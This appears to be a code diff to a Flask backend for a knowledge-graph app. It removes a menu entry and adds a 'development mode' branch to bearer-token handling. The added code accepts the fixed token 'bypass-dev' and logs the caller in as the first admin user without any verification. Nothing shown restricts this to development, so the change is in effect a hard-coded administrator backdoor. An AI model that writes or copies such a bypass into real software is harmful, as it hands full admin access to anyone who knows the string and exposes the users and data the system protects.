@@ -137,17 +137,6 @@ DEFAULT_MENU_TREE = [
                 'status': 1,
             },
             {
-                'id': 34,
-                'pid': 3,
-                'name': 'KgConstruct',
-                'type': 'menu',
-                'title': 'page.kg.construct',
-                'path': '/kg/construct',
-                'component': '/kg/kg_construct/index',
-                'icon': 'mdi:database-plus-outline',
-                'status': 1,
-            },
-            {
                 'id': 35,
                 'pid': 3,
                 'name': 'KgManagement',
@@ -296,6 +285,18 @@ def _decode_request_user():
         return None, (jsonify({'code': 401, 'message': 'missing bearer token'}), 401)
 
     token = auth.split(' ', 1)[1]
+
+    # BYPASS_AUTH 开发模式：前端发送 bypass-dev 时，返回第一个管理员用户
+    if token == 'bypass-dev':
+        dev_user = User.query.filter(
+            User.role.in_(['super', 'superadmin', 'admin'])
+        ).first()
+        if not dev_user:
+            dev_user = User.query.first()
+        if dev_user:
+            return dev_user, None
+        return None, (jsonify({'code': 401, 'message': 'no dev user found'}), 401)
+
     user_id = _decode_token(token)
     if not user_id:
         return None, (jsonify({'code': 401, 'message': 'invalid token'}), 401)
